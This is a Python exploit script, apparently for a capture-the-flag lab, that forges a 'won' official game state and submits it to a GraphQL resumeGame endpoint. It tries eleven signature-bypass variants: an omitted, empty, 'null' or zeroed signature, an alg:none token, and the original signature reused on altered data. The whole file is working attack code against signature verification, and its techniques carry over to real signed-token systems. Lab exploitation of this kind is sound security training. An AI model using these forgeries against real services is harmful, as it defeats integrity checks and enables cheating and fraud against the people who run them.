#!/usr/bin/env python3
"""Haiku hint: 'no signature shown / the official board still plays / the seal is your own'.
Forge a WON official payload; submit via resumeGame with the signature segment omitted or
emptied, to test for a verification short-circuit (if(sig && !verify) ...)."""
import json, base64, urllib.request, urllib.error, copy
BASE = "https://lab-1789247580198-x72v50.labs-app.bugforge.io"

def gql(query, variables=None):
    body = json.dumps({"query": query, "variables": variables or {}}).encode()
    req = urllib.request.Request(BASE + "/graphql", data=body, headers={"Content-Type":"application/json"})
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return json.loads(r.read())
    except urllib.error.HTTPError as e:
        return json.loads(e.read())

def b64e(b):
    return base64.urlsafe_b64encode(b).decode().rstrip("=")
def b64d(s):
    return base64.urlsafe_b64decode(s + '='*(-len(s)%4))

GF = "id mode phase size firstPlayer currentPlayer winner collected1 collected2 message certificate dice { id owner value row col deployed alive }"
RESUME = "mutation($c:String!){ resumeGame(code:$c){ %s } }" % GF

# get a real official code
code = gql("mutation{ dailyChallenge }")["data"]["dailyChallenge"]
p_b64, sig_b64 = code.split(".")
payload = json.loads(b64d(p_b64))

# forge a WON, flawless official state
won = copy.deepcopy(payload)
won["official"] = True
g = won["game"]
g["phase"] = "over"; g["winner"] = 1; g["currentPlayer"] = 1
g["collected1"] = 3; g["collected2"] = 0
# reflect 3 enemy dice captured (value 0 / not alive) for realism
dead = 0
for d in g["dice"]:
    if d["owner"] == 2 and dead < 3:
        d["alive"] = False; d["value"] = 0; dead += 1
    elif d["owner"] == 2:
        d["deployed"] = True; d["row"] = 6; d["col"] = d["col"] if d.get("col") is not None else 0
    else:
        d["deployed"] = True; d["row"] = 1
new_p = b64e(json.dumps(won, separators=(",",":")).encode())

variants = {
    "A_no_sig_no_dot":       new_p,
    "B_trailing_dot_empty":  new_p + ".",
    "C_empty_b64_sig":       new_p + "." + b64e(b""),
    "D_double_dot":          new_p + "..",
    "E_leading_dot":         "." + new_p,
    "F_sig_literal_null":    new_p + ".null",
    "G_sig_undefined":       new_p + ".undefined",
    "H_jwt_3part":           b64e(b'{"alg":"none"}') + "." + new_p + ".",
    "I_orig_sig_kept":       new_p + "." + sig_b64,
    "J_sig_zeros":           new_p + "." + b64e(b"\x00"*32),
    "K_payload_only_with_orig_sig_of_unmodified": p_b64 + "." + sig_b64,  # control: valid unmodified
}

for name, c in variants.items():
    r = gql(RESUME, {"c": c})
    if "errors" in r:
        print(f"{name:28s} ERR: {r['errors'][0]['message']}")
    else:
        game = r["data"]["resumeGame"]
        print(f"{name:28s} OK  winner={game['winner']} phase={game['phase']} c1={game['collected1']} c2={game['collected2']} CERT={game['certificate']!r}")
